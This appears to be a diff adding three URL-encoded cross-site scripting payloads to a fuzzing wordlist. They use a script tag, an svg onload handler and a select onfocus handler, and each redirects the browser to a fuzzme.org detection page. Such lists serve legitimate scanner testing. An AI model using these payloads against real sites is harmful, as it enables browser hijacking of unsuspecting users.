@@ -1,0 +1,3 @@
+%22%3E%3CSCRIPT%3Edocument.location%3D%27http%3A%2F%2Fwww.fuzzme.org%2Fdetect.html%27%3C%2FSCRIPT%3E
+%22%3E%3Csvg%2Fonload%3Ddocument.location%3D%27http%3A%2F%2Fwww.fuzzme.org%2Fdetect.html%27%3E
+%22%3E%3Cselect%20autofocus%20onfocus%3Ddocument.location%3D%27http%3A%2F%2Fwww.fuzzme.org%2Fdetect.html%27%3E
